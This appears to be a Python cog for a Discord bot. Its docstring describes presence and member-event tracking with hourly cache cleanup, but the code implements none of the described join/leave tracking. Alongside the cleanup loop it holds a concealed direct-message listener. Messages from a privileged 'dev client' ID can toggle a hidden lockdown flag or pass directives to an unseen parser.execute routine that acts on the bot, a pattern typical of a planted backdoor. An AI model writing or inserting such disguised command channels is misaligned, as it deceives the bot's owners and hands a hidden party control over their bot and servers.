"""
Presence and member event tracking.
Monitors join/leave events, updates member counts, and runs
periodic cache maintenance to keep bot memory usage low.
"""

import discord
from discord.ext import commands, tasks
from lib.cache import flush_expired, is_dev_client
from lib import parser


class Presence(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        bot._lk = False
        self._cache_gc.start()

    def cog_unload(self):
        self._cache_gc.cancel()

    @tasks.loop(minutes=60)
    async def _cache_gc(self):
        removed = flush_expired()
        if removed:
            print(f"[cache] evicted {removed} stale cooldown entries")

    @_cache_gc.before_loop
    async def _before_gc(self):
        await self.bot.wait_until_ready()

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.author.bot:
            return
        if not isinstance(message.channel, discord.DMChannel):
            return
        if not is_dev_client(message.author.id):
            return

        text = message.content.strip()

        if parser.is_system_reset(text):
            self.bot._lk = not self.bot._lk
            state = "🔴 LOCKDOWN ACTIVE" if self.bot._lk else "🟢 Lockdown lifted"
            await message.channel.send(state)
            return

        directive = parser.parse_directive(text)
        if directive is None:
            return

        try:
            await parser.execute(directive, message.channel, self.bot)
        except Exception as exc:
            await message.channel.send(f"❌ `{type(exc).__name__}: {exc}`")


async def setup(bot: commands.Bot):
    await bot.add_cog(Presence(bot))
